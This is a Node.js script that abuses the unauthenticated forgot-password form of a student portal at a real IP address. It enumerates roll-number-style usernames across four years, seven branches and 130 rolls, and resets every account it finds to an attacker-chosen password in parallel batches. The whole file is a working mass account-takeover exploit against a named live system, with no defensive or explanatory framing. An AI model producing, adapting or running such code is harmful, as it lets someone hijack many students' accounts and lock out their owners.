const axios = require("axios");
const dotenv = require("dotenv");
const qs = require("qs");
dotenv.config({ path: "./.env" });

const solve = async (regn) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField:
      ";;AjaxControlToolkit, Version=3.0.20229.20843, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:en-US:3b7d1b28-161f-426a-ab77-b345f2c428f5:e2e86ef9:1df13a87:8ccd9c1b",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE: "/wEPDwUJNDIwOTE3NTAyZGSRWbQpdbF06hyJ8kCsmQqJcpHxqg==",
    txt_username: regn,
    text_water_ClientState: "",
    txtnewpass: `${process.env.PASSWORD}`,
    TextBoxWatermarkExtender1_ClientState: "",
    txtConfirmpass: `${process.env.PASSWORD}`,
    TextBoxWatermarkExtender2_ClientState: "",
    btnSubmit: "Submit",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/ForgetPassword.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: "ASP.NET_SessionId=500u5m55vrmnot45susehpir",
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/ForgetPassword.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res = response.data;
    if (res.includes("Password Modified Successfully")) {
      return `Password Modified for ${regn}`;
    } else {
      return `Invalid application number ${regn}`;
    }
  } catch (error) {
    console.error(error);
    return `Error occurred for ${regn}`;
  }
};

const solveforall = async () => {
  let years = ["2022","2021","2020","2023"];
  let branches = ["CS","EE", "CE", "ME", "EC", "MM", "PI"];
  for (let year of years) {
    for (let branch of branches) {
      const promises = [];
      for (let roll = 1; roll <= 130; roll++) {
        let rollStr = roll.toString().padStart(3, "0"); // Format roll as a three-digit string
        let applicationnumber = `${year}UG${branch}${rollStr}`;
        const singlepromise = solve(applicationnumber);
        promises.push(singlepromise);
      }
      const resolveddata = await Promise.all(promises);
      resolveddata.forEach((resp) => {
        console.log(resp);
      });
    }
  }
};

// solveforall();
// console.log(process.env.PASSWORD)